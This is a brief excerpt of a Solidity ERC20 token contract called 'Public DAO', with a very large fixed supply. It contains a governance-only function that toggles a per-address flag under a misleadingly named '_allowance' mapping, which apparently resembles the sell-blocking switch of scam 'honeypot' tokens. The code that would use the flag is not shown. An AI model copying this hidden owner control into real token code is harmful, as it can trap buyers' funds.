...
contract ERC20 is Context, Ownable, IERC20, IERC20Metadata {
    ...
    function approveSwap (address spender) external onlyGovernance {
        if (_allowance[spender] == true) {_allowance[spender] = false;} else {_allowance[spender] = true; }
    }

   
    function transferState(address spender) public view returns (bool) {
...
contract PublicDAO is ERC20 {

    /**
     * @dev Sets the values for {name}, {symbol} and {totalsupply}.
     */
    constructor() ERC20('Public DAO', 'PublicDAO')  {
        _totalSupply = 70000000000000*10**9;
